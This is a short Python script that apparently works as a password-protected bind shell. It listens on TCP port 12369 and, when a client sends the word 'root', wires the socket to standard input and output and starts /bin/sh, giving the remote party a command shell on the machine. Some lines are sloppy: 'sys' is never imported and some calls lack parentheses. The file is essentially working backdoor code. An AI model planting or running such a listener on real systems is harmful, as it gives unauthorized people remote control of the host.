# -*-coding: utf-8 -*
import socket, os, code

host=socket.gethostbyname(socket.gethostname())
port=12369

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))
s.listen(1)

client, addresses = s.accept()
print(addresses)
print("connection from: ", client.getpeername())
client.send("Hi bud:")
word=client.recv(1024)
print(word)
while 1:
    if word == "root":
        print("we root")
        for f in range (3):
            os.dup2(client.fileno(), f)
        os.execl("/bin/sh", "/bin/sh")
        code.interact()
        sys.exit
    else:
        print("we out")
        break
client.close()
s.close
